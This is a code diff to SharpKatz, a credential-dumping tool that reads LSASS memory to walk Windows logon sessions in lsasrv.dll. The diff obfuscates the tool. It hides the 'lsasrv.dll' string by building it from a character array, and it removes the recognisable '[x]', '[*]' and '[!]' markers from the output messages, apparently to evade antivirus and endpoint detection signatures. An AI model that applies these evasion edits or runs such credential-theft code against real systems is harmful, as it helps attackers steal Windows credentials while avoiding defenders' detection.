@@ -54,25 +54,26 @@ namespace SharpKatz.Module
             int logonSessionListCount; //*DWORD
 
             // Search for LogonSessionList signature within lsasrv.dll and grab the offset
-            logonSessionListSignOffset = (uint)Utility.OffsetFromSign("lsasrv.dll", oshelper.logonSessionListSign, max_search_size);
+            string sLsasrv = new string(new char[] { 'l','s','a','s','r','v','.','d','l','l' });
+            logonSessionListSignOffset = (uint)Utility.OffsetFromSign(sLsasrv, oshelper.logonSessionListSign, max_search_size);
             if (logonSessionListSignOffset == 0)
             {
-                Console.WriteLine("[x] Error: Could not find LogonSessionList signature\n");
+                Console.WriteLine("    Error: Could not find LogonSessionList signature\n");
                 return 1;
             }
-            //Console.WriteLine("[*] LogonSessionList offset found as {0}", logonSessionListSignOffset);
+            //Console.WriteLine("    LogonSessionList offset found as {0}", logonSessionListSignOffset);
 
             //logonSessionListAddr = Utility.GetIntPtr(hLsass, lsasrvMem, logonSessionListSignOffset, oshelper.LOGONSESSIONLISTOFFSET);
             logonSessionListCount = Utility.GetInt(hLsass, lsasrvMem, logonSessionListSignOffset, oshelper.LOGONSESSIONSLISTCOUNTOFFSET);
 
-            //Console.WriteLine("[*] LogSessList found at address {0:X}", logonSessionListAddr.ToInt64());
-            //Console.WriteLine("[*] LogSessListCount {0}", logonSessionListCount);
+            //Console.WriteLine("    LogSessList found at address {0:X}", logonSessionListAddr.ToInt64());
+            //Console.WriteLine("    LogSessListCount {0}", logonSessionListCount);
 
             IntPtr current = IntPtr.Zero;
 
             for (int i = 0; i < logonSessionListCount; i++)
             {
-                //Console.WriteLine("[!] logonSessionListCount:"+ logonSessionListCount + " -> Step  : " + i);
+                //Console.WriteLine("    logonSessionListCount:"+ logonSessionListCount + " -> Step  : " + i);
 
                 current = Utility.GetIntPtr(hLsass, lsasrvMem, logonSessionListSignOffset, oshelper.LOGONSESSIONLISTOFFSET + (8 * i));
                 IntPtr pList = current;
